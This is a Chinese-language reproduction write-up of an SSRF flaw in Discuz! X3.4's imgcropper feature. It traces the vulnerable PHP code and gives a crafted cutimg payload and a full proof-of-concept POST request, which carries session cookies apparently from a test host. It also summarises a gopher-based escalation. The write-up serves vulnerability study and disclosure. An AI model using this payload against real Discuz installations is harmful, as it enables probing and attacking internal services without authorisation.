<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.csBC719D4E{color:#000000;background-color:transparent;font-family:Segoe UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="discuz-x34-imgcropper-ssrf"><span class="csDE05BCC">Discuz! X3.4 imgcropper ssrf</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">对</span><span class="cs8926E06"> PHP</span><span class="cs9C1B1871">、</span><span class="cs8926E06">curl </span><span class="cs9C1B1871">版本都有特殊的要求，而且要服务端环境接受空</span><span class="cs8926E06"> Host </span><span class="cs9C1B1871">的请求，总的来说比较鸡肋</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9FB05234">source/class/class_image.php</span><span class="cs8926E06"> </span><span class="cs9FB05234">image</span><span class="cs9C1B1871">类</span><span class="cs9FB05234">init</span><span class="cs9C1B1871">方法：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;function init($method, $source, $target, $nosuffix = 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global $_G;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;errorcode = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(empty($source)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$parse = parse_url($source);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(isset($parse[&#39;host&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(empty($target)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = dfsockopen($source);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;tmpfile = $source = tempnam($_G[&#39;setting&#39;][&#39;attachdir&#39;].&#39;./temp/&#39;, &#39;tmpimg_&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!$data || $source === FALSE) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($source, $data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;......</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再找哪些地方调用了</span><span class="cs9FB05234">image</span><span class="cs9C1B1871">类的</span><span class="cs9FB05234">init</span><span class="cs9C1B1871">方法，发现</span><span class="cs9FB05234">image</span><span class="cs9C1B1871">类的</span><span class="cs9FB05234">Thumb</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">Cropper</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">Watermark</span><span class="cs9C1B1871">方法都调用了</span><span class="cs9FB05234">init</span><span class="cs9C1B1871">。比如</span><span class="cs9FB05234">Thumb</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;function Thumb($source, $target, $thumbwidth, $thumbheight, $thumbtype = 1, $nosuffix = 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$return = $this-&gt;init(&#39;thumb&#39;, $source, $target, $nosuffix);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;......</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以再找哪些地方调用了</span><span class="cs9FB05234">image</span><span class="cs9C1B1871">类的</span><span class="cs9FB05234">Thumb</span><span class="cs9C1B1871">方法，最终发现：</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">source/module/misc/misc_imgcropper.php</span><span class="cs8926E06"> 52-57</span><span class="cs9C1B1871">行：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;require_once libfile(&#39;class/image&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$image = new image();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$prefix = $_GET[&#39;picflag&#39;] == 2 ? $_G[&#39;setting&#39;][&#39;ftp&#39;][&#39;attachurl&#39;] : $_G[&#39;setting&#39;][&#39;attachurl&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(!$image-&gt;Thumb($prefix.$_GET[&#39;cutimg&#39;], $cropfile, $picwidth, $picheight)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;showmessage(&#39;imagepreview_errorcode_&#39;.$image-&gt;errorcode, null, null, array(&#39;showdialog&#39; =&gt; true, &#39;closetime&#39; =&gt; true));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下断点调试发现</span><span class="cs8926E06"> </span><span class="cs9FB05234">$_G[&#39;setting&#39;][&#39;ftp&#39;][&#39;attachurl&#39;]</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的值为</span><span class="cs8926E06"> </span><span class="cs9FB05234">/</span><span class="cs9C1B1871">，而</span><span class="cs8926E06"> </span><span class="cs9FB05234">$_G[&#39;setting&#39;][&#39;attachurl&#39;]</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的值是</span><span class="cs8926E06"> </span><span class="cs9FB05234">data/attachment/</span><span class="cs9C1B1871">。所以似乎</span><span class="cs8926E06"> </span><span class="cs9FB05234">$prefix</span><span class="cs8926E06"> </span><span class="cs9C1B1871">为</span><span class="cs8926E06"> </span><span class="cs9FB05234">/</span><span class="cs8926E06"> </span><span class="cs9C1B1871">才有</span><span class="cs8926E06"> SSRF </span><span class="cs9C1B1871">利用的可能。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">一开始构造</span><span class="cs8926E06"> </span><span class="cs9FB05234">cutimg=/10.0.1.1/get</span><span class="cs9C1B1871">，这样</span><span class="cs8926E06"> </span><span class="cs9FB05234">$url</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的值就为</span><span class="cs8926E06"> </span><span class="cs9FB05234">//10.0.1.1/get</span><span class="cs9C1B1871">，按道理来说这应该算是一个正常的</span><span class="cs8926E06"> url</span><span class="cs9C1B1871">，但是结果却请求失败了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">仔细跟进</span><span class="cs8926E06"> </span><span class="cs9FB05234">_dfsockopen</span><span class="cs8926E06"> </span><span class="cs9C1B1871">发现，在</span><span class="cs8926E06"> PHP </span><span class="cs9C1B1871">环境安装有</span><span class="cs8926E06"> cURL </span><span class="cs9C1B1871">时，进入</span><span class="cs8926E06"> curl </span><span class="cs9C1B1871">处理的代码分支，直到这里：</span></p><p class="cs3A447A38"><span class="cs9FB05234">curl_setopt($ch, CURLOPT_URL, $scheme.&#39;://&#39;.($ip ? $ip : $host).($port ? &#39;:&#39;.$port : &#39;&#39;).$path);</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">$scheme</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">$host</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">$port</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">$path</span><span class="cs8926E06"> </span><span class="cs9C1B1871">都是</span><span class="cs8926E06"> </span><span class="cs9FB05234">parse_url</span><span class="cs8926E06"> </span><span class="cs9C1B1871">解析</span><span class="cs8926E06"> url </span><span class="cs9C1B1871">参数后的对应的值，而对像</span><span class="cs8926E06"> </span><span class="cs9FB05234">//10.0.1.1/get</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这样的</span><span class="cs8926E06"> url </span><span class="cs9C1B1871">解析时，</span><span class="cs9FB05234">$scheme</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的值是</span><span class="cs8926E06"> </span><span class="cs9FB05234">null</span><span class="cs9C1B1871">，因此最后拼接的结果是</span><span class="cs8926E06"> </span><span class="cs9FB05234">://10.0.1.1/get</span><span class="cs9C1B1871">，没有协议，</span><span class="cs8926E06">curl </span><span class="cs9C1B1871">最后对这种</span><span class="cs8926E06">url</span><span class="cs9C1B1871">的请求会自动在前面加上</span><span class="cs8926E06"> </span><span class="cs9FB05234">HTTP://</span><span class="cs9C1B1871">，结果就变成了请求</span><span class="cs8926E06"> </span><span class="cs9FB05234">HTTP://://10.0.1.1/get</span><span class="cs9C1B1871">，这种</span><span class="cs8926E06"> url </span><span class="cs9C1B1871">在我的环境中会导致</span><span class="cs8926E06"> curl </span><span class="cs9C1B1871">报错。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以我去掉了</span><span class="cs8926E06"> curl </span><span class="cs9C1B1871">扩展，让</span><span class="cs8926E06"> </span><span class="cs9FB05234">_dfsockopen</span><span class="cs8926E06"> </span><span class="cs9C1B1871">函数代码走</span><span class="cs8926E06"> socket </span><span class="cs9C1B1871">发包的流程，踩了</span><span class="cs8926E06"> </span><span class="cs9FB05234">parse_url</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> Dz </span><span class="cs9C1B1871">代码的一些坑点（这里就不展开了，有兴趣的同学调下代码就知道了），最后发现像这样构造可以成功：</span></p><p class="cs3A447A38"><span class="cs9FB05234">cutimg=/:@localhost:9090/dz-imgcropper-ssrf</span></p><p class="cs40DD2BC9"><span class="cs8926E06">poc:</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /misc.php?mod=imgcropper&amp;picflag=2&amp;cutimg=/:@localhost:9090/dz-imgcropper-ssrf HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: ubuntu-trusty.com</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: en-US,en;q=0.5</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: xkmD_2132_sid=E5sbVr; xkmD_2132_saltkey=m6Y8022s; xkmD_2132_lastvisit=1521612483; xkmD_2132_lastact=1521624907%09misc.php%09imgcropper; xkmD_2132_home_readfeed=1521616105; xkmD_2132_seccode=1.ecda87c571707d3f92; xkmD_2132_ulastactivity=a0f4A9CWpermv2t0GGOrf8%2BzCf6dZyAoQ3Sto7ORINqJeK4g3xcX; xkmD_2132_auth=40a4BIESn2PZVmGftNQ2%2BD1ImxpYr0HXke37YiChA2ruG6OryhLe0bUg53XKlioysCePIZGEO1jmlB1L4qbo; XG8F_2132_sid=fKyQMr; XG8F_2132_saltkey=U7lxxLwx; XG8F_2132_lastvisit=1521683793; XG8F_2132_lastact=1521699709%09index.php%09; XG8F_2132_ulastactivity=200fir8BflS1t8ODAa3R7YNsZTQ1k262ysLbc9wdHRzbPnMZ%2BOv7; XG8F_2132_auth=3711UP00sKWDx2Vo1DtO17C%2FvDfrelGOrwhtDmwu5vBjiXSHuPaFVJ%2FC%2BQi1mw4v4pJ66jx6otRFKfU03cBy; XG8F_2132_lip=172.16.99.1%2C1521688203; XG8F_2132_nofavfid=1; XG8F_2132_onlineusernum=3; XG8F_2132_sendmail=1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 36</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">imgcroppersubmit=1&amp;formhash=f8472648</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时</span><span class="cs8926E06"> url </span><span class="cs9C1B1871">即为</span><span class="cs9FB05234">//:@localhost:9090/dz-imgcropper-ssrf</span><span class="cs9C1B1871">。</span><span class="cs8926E06">SSRF </span><span class="cs9C1B1871">请求成功：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20imgcropper%20ssrf_files/image0.png" width="560" height="132" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过这种方式进行构造利用的话，不太需要额外的限制条件（只要求服务端</span><span class="cs8926E06"> PHP </span><span class="cs9C1B1871">环境没有安装</span><span class="cs8926E06"> curl </span><span class="cs9C1B1871">扩展）</span><span class="csBC719D4E">￼</span><span class="cs9C1B1871">，但是只能发</span><span class="cs8926E06"> HTTP GET </span><span class="cs9C1B1871">请求，并且服务端不跟随跳转。漏洞危害有限。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">后来</span><span class="cs8926E06"> l3m0n </span><span class="cs9C1B1871">师傅也独立发现了这个漏洞，并且他发现较高版本的</span><span class="cs8926E06"> curl </span><span class="cs9C1B1871">是可以成功请求</span><span class="cs8926E06"> </span><span class="cs9FB05234">HTTP://:/</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的，较高版本的</span><span class="cs8926E06"> curl </span><span class="cs9C1B1871">会将这种</span><span class="cs8926E06"> url </span><span class="cs9C1B1871">地址解析到</span><span class="cs8926E06"> 127.0.0.1 </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> 80 </span><span class="cs9C1B1871">端口：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20imgcropper%20ssrf_files/image0.jpg" width="560" height="320" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后他再利用之前</span><span class="cs8926E06"> PHP </span><span class="cs9FB05234">parse_url</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的解析</span><span class="cs8926E06"> bug</span><span class="cs9C1B1871">（</span><span class="cs8926E06"> <a class="cs508254C" href="https://link.zhihu.com/?target=https%3A//bugs.php.net/bug.php%3Fid%3D73192"><span class="cs4B51D5E4">https://bugs.php.net/bug.php?id=73192</span></a></span><span class="cs8926E06"> </span><span class="cs9C1B1871">），及利用</span><span class="cs8926E06"> </span><span class="cs9FB05234">parse_url</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> curl </span><span class="cs9C1B1871">对</span><span class="cs8926E06"> url </span><span class="cs9C1B1871">的解析差异，成功进行</span><span class="cs8926E06"> 302 </span><span class="cs9C1B1871">跳转到任意恶意地址，最后再</span><span class="cs8926E06"> 302 </span><span class="cs9C1B1871">跳转到</span><span class="cs8926E06"> gopher </span><span class="cs9C1B1871">就做到发送任意数据包。详情可以参考</span><span class="cs8926E06"> l3m0n </span><span class="cs9C1B1871">的博客：</span></p><p class="cs40DD2BC9"><span class="cs8926E06"><a class="cs508254C" href="https://link.zhihu.com/?target=https%3A//www.cnblogs.com/iamstudy/articles/discuz_x34_ssrf_1.html"><span class="cs4B51D5E4">Discuz x3.4</span><span class="cs1C2E50E7">前台</span><span class="cs4B51D5E4">SSRF - l3m0n - </span><span class="cs1C2E50E7">博客园</span></a></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是这种利用方式对</span><span class="cs8926E06"> PHP</span><span class="cs9C1B1871">、</span><span class="cs8926E06">curl </span><span class="cs9C1B1871">版本都有特殊的要求，而且要服务端环境接受空</span><span class="cs8926E06"> Host </span><span class="cs9C1B1871">的请求。总的来说，</span><span class="cs8926E06">imgcropper SSRF </span><span class="cs9C1B1871">仍然比较鸡肋。</span></p></body>
</html>
